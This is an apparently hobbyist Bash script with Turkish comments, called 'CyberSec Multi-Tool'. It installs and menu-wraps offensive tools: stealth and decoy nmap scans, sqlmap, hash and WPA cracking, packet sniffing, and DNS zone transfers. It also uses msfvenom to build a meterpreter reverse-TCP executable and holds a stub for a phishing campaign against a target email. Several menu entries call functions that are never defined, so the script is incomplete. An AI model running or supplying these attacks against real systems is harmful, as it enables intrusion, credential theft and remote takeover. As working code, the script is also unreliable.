#!/bin/bash

# Güvenlik ayarları
set -o nounset
set -o pipefail
umask 077

# Script bilgileri
SCRIPT_VERSION="3.0"
LAST_UPDATED="2025-04-13"
AUTHOR="officialrootman"

# Renkli çıktılar için yardımcı işlevler
info() { echo -e "\e[34m[INFO]\e[0m $1"; }
success() { echo -e "\e[32m[SUCCESS]\e[0m $1"; }
error() { echo -e "\e[31m[ERROR]\e[0m $1"; }
warning() { echo -e "\e[33m[WARNING]\e[0m $1"; }

# Bağımlılıklar listesi
DEPENDENCIES=(
    "nmap"
    "openssl"
    "sshpass"
    "grep"
    "findutils"
    "coreutils"
    "metasploit"
    "hydra"
    "nikto"
    "dirb"
    "sqlmap"
    "gobuster"
    "wireshark"
    "tcpdump"
    "john"
    "hashcat"
    "aircrack-ng"
    "wpscan"
)

# ISH Shell için paket yöneticisi kurulumu ve güncelleme
setup_package_manager() {
    if ! command -v apk &> /dev/null; then
        error "Alpine paket yöneticisi (apk) bulunamadı!"
        exit 1
    fi
    info "Paket deposu güncelleniyor..."
    apk update && apk upgrade || {
        error "Paket güncelleme işlemi başarısız!"
        exit 1
    }
    
    # Community ve Testing repolarını ekle
    echo "http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories
    echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories
    apk update
}

# Gelişmiş bağımlılık kontrolü ve kurulum
install_dependencies() {
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "${dep%% *}" &> /dev/null; then
            info "$dep kurulumu başlatılıyor..."
            if apk add "$dep" || apk add --no-cache "$dep"; then
                success "$dep başarıyla kuruldu."
            else
                warning "$dep kurulumu başarısız. Alternatif kaynak deneniyor..."
                if apk add --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing "$dep"; then
                    success "$dep alternatif kaynaktan kuruldu."
                else
                    error "$dep kurulumu başarısız!"
                    continue
                fi
            fi
        else
            info "$dep zaten kurulu."
        fi
    done
}

# Gelişmiş ağ taraması
network_scan() {
    local scan_type
    echo "Tarama türünü seçin:"
    echo "1) Hızlı tarama"
    echo "2) Detaylı tarama"
    echo "3) Gizli tarama"
    echo "4) Zafiyet taraması"
    read -p "Seçiminiz: " scan_type

    read -p "Hedef IP/Domain: " target

    case $scan_type in
        1) # Hızlı tarama
            nmap -T4 -F "$target"
            ;;
        2) # Detaylı tarama
            nmap -sS -sV -A -O "$target"
            ;;
        3) # Gizli tarama
            nmap -sS -T2 -f -D RND:10 "$target"
            ;;
        4) # Zafiyet taraması
            nmap -sV --script vuln "$target"
            ;;
        *) error "Geçersiz seçim!" ;;
    esac
}

# Web uygulama testi
web_app_test() {
    read -p "Hedef URL (örn: http://example.com): " url
    
    echo "Test türünü seçin:"
    echo "1) Dizin tarama (Gobuster)"
    echo "2) SQL Injection testi (SQLMap)"
    echo "3) WordPress tarama (WPScan)"
    echo "4) Zafiyet tarama (Nikto)"
    read -p "Seçiminiz: " test_type

    case $test_type in
        1)
            read -p "Wordlist dosyası (varsayılan için boş bırakın): " wordlist
            wordlist=${wordlist:-"/usr/share/wordlists/dirb/common.txt"}
            gobuster dir -u "$url" -w "$wordlist" -t 50
            ;;
        2)
            sqlmap -u "$url" --batch --random-agent
            ;;
        3)
            wpscan --url "$url" --enumerate p,t,u
            ;;
        4)
            nikto -h "$url"
            ;;
        *) error "Geçersiz seçim!" ;;
    esac
}

# Şifre kırma araçları
password_cracking() {
    echo "Şifre kırma aracını seçin:"
    echo "1) Hashleri kır (John the Ripper)"
    echo "2) WPA/WPA2 şifre kırma (Aircrack-ng)"
    echo "3) GPU destekli hash kırma (Hashcat)"
    read -p "Seçiminiz: " crack_type

    case $crack_type in
        1)
            read -p "Hash dosyası: " hash_file
            john --format=raw-md5 "$hash_file"
            ;;
        2)
            read -p "Capture dosyası (.cap): " cap_file
            read -p "Wordlist dosyası: " wordlist
            aircrack-ng -w "$wordlist" "$cap_file"
            ;;
        3)
            read -p "Hash dosyası: " hash_file
            read -p "Hash türü (örn: 0 for MD5): " hash_type
            hashcat -m "$hash_type" -a 0 "$hash_file" /usr/share/wordlists/rockyou.txt
            ;;
        *) error "Geçersiz seçim!" ;;
    esac
}

# Ağ dinleme ve paket yakalama
network_sniffing() {
    echo "Ağ dinleme aracını seçin:"
    echo "1) TCPDump ile paket yakalama"
    echo "2) Wireshark ile analiz"
    read -p "Seçiminiz: " sniff_type

    case $sniff_type in
        1)
            read -p "Interface (örn: eth0): " interface
            read -p "Filtre (boş bırakılabilir): " filter
            tcpdump -i "$interface" ${filter:+"$filter"} -w "capture-$(date +%Y%m%d-%H%M%S).pcap"
            ;;
        2)
            read -p "Analiz edilecek .pcap dosyası: " pcap_file
            wireshark "$pcap_file"
            ;;
        *) error "Geçersiz seçim!" ;;
    esac
}

# Sosyal mühendislik araçları
social_engineering() {
    if ! command -v msfconsole &> /dev/null; then
        info "Metasploit Framework kurulumu başlatılıyor..."
        setup_metasploit
    fi

    echo "Sosyal mühendislik aracını seçin:"
    echo "1) Phishing kampanyası"
    echo "2) Payload oluşturma"
    read -p "Seçiminiz: " se_type

    case $se_type in
        1)
            read -p "Hedef e-posta: " target_email
            read -p "Şablon (1-5): " template
            # Burada phishing kampanyası kodu gelecek
            ;;
        2)
            read -p "Platform (windows/linux/android): " platform
            read -p "IP: " lhost
            read -p "Port: " lport
            msfvenom -p "$platform/meterpreter/reverse_tcp" LHOST="$lhost" LPORT="$lport" -f exe -o payload.exe
            ;;
        *) error "Geçersiz seçim!" ;;
    esac
}

# Zafiyet tarama
vulnerability_scan() {
    echo "Zafiyet tarama türünü seçin:"
    echo "1) Sistem zafiyetleri"
    echo "2) Web uygulama zafiyetleri"
    echo "3) Ağ zafiyetleri"
    read -p "Seçiminiz: " vuln_type

    case $vuln_type in
        1)
            read -p "Hedef IP: " target
            nmap -sV --script vuln "$target"
            ;;
        2)
            read -p "Hedef URL: " url
            nikto -h "$url" -Tuning 123457
            ;;
        3)
            read -p "Hedef ağ (örn: 192.168.1.0/24): " network
            nmap -sV -sC --script vuln "$network"
            ;;
        *) error "Geçersiz seçim!" ;;
    esac
}

# DNS bilgi toplama
dns_enumeration() {
    read -p "Hedef domain: " domain
    
    echo "DNS bilgi toplama türünü seçin:"
    echo "1) DNS kayıtları"
    echo "2) Alt domainler"
    echo "3) Zone transfer"
    read -p "Seçiminiz: " dns_type

    case $dns_type in
        1)
            dig +nocmd "$domain" ANY +noall +answer
            ;;
        2)
            gobuster dns -d "$domain" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
            ;;
        3)
            dig axfr "$domain"
            ;;
        *) error "Geçersiz seçim!" ;;
    esac
}

# SSL/TLS analizi
ssl_analysis() {
    read -p "Hedef host:port: " target
    
    echo "SSL/TLS analiz türünü seçin:"
    echo "1) Sertifika bilgisi"
    echo "2) Desteklenen protokoller"
    echo "3) Zafiyet taraması"
    read -p "Seçiminiz: " ssl_type

    case $ssl_type in
        1)
            openssl s_client -connect "$target" </dev/null 2>/dev/null | openssl x509 -text
            ;;
        2)
            nmap --script ssl-enum-ciphers -p 443 "${target%:*}"
            ;;
        3)
            nmap --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443 "${target%:*}"
            ;;
        *) error "Geçersiz seçim!" ;;
    esac
}

# Yardım menüsü güncellendi
show_help() {
    cat << EOF
CyberSec Multi-Tool v${SCRIPT_VERSION}
Yazar: ${AUTHOR}
Son Güncelleme: ${LAST_UPDATED}

Kullanım:
  1) Ağ Taraması: Gelişmiş port ve servis taraması
  2) Web Uygulama Testi: Web uygulamaları için güvenlik testleri
  3) Şifre Kırma: Çeşitli şifre kırma araçları
  4) Ağ Dinleme: Paket yakalama ve analiz
  5) Sosyal Mühendislik: Sosyal mühendislik araçları
  6) Zafiyet Tarama: Sistem ve ağ zafiyet taraması
  7) DNS Bilgi Toplama: DNS kayıtları ve alt domain keşfi
  8) SSL/TLS Analizi: SSL sertifika ve protokol analizi
  9) Log Analizi: Log dosyası analizi
  10) Hash İşlemleri: Dosya hash hesaplama ve kontrol
  11) SSH Testleri: SSH güvenlik testleri
  12) Dosya İzinleri: Zayıf dosya izinlerini kontrol
  13) Dosya Şifreleme: AES-256 ile dosya şifreleme
  14) Yardım: Bu menüyü gösterir
  15) Çıkış: Programdan çıkar

Not: Bu tool etik hack testleri için tasarlanmıştır.
Kötüye kullanım kullanıcının sorumluluğundadır.
EOF
}

# Ana menü güncellendi
main() {
    clear
    info "CyberSec Multi-Tool Pro Edition başlatılıyor..."
    
    # ISH Shell için kurulum ve kontroller
    setup_package_manager
    install_dependencies
    
    while true; do
        echo -e "\nCyberSec Multi-Tool v${SCRIPT_VERSION} - Pro Edition"
        echo "1) Ağ Taraması"
        echo "2) Web Uygulama Testi"
        echo "3) Şifre Kırma"
        echo "4) Ağ Dinleme"
        echo "5) Sosyal Mühendislik"
        echo "6) Zafiyet Tarama"
        echo "7) DNS Bilgi Toplama"
        echo "8) SSL/TLS Analizi"
        echo "9) Log Analizi"
        echo "10) Hash İşlemleri"
        echo "11) SSH Testleri"
        echo "12) Dosya İzinleri"
        echo "13) Dosya Şifreleme"
        echo "14) Yardım"
        echo "15) Çıkış"
        read -p "Seçiminizi yapın: " choice
        
        case $choice in
            1) network_scan ;;
            2) web_app_test ;;
            3) password_cracking ;;
            4) network_sniffing ;;
            5) social_engineering ;;
            6) vulnerability_scan ;;
            7) dns_enumeration ;;
            8) ssl_analysis ;;
            9) log_analysis ;;
            10) hash_check ;;
            11) ssh_bruteforce ;;
            12) find_weak_permissions ;;
            13) file_encrypt ;;
            14) show_help ;;
            15) info "Program sonlandırılıyor..."; exit 0 ;;
            *) error "Geçersiz seçim!" ;;
        esac
    done
}

# Programı başlat
main